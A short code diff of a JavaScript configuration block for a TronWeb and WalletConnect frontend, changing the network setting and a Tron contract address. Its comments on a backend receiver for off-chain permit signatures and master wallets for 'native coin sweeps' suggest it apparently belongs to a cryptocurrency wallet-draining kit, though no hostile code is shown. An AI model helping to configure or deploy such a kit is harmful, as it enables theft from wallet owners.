@@ -30,6 +30,7 @@ import TronWeb from 'tronweb'
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Nile' // Change to 'Mainnet' when ready
+// const NETWORK = 'Mainnet'
 
 // 🔗 BACKEND API URL FOR OFF-CHAIN PERMIT SIGNATURES
 // When you build your backend receiver, put the URL here (e.g., 'https://your-vps-ip.com/api').
@@ -37,7 +38,7 @@ const NETWORK = 'Nile' // Change to 'Mainnet' when ready
 const BACKEND_API_URL = ''; 
 
 // 🔥 CONTRACT ADDRESSES
-const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
+const TRON_CONTRACT_ADDRESS = 'TYSGZdf7tZqZcPrzumTCu3AGyTKu2XuTjm'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
 // 🎨 UI DISPLAY ADDRESSES (Master Wallets for Native Coin Sweeps)
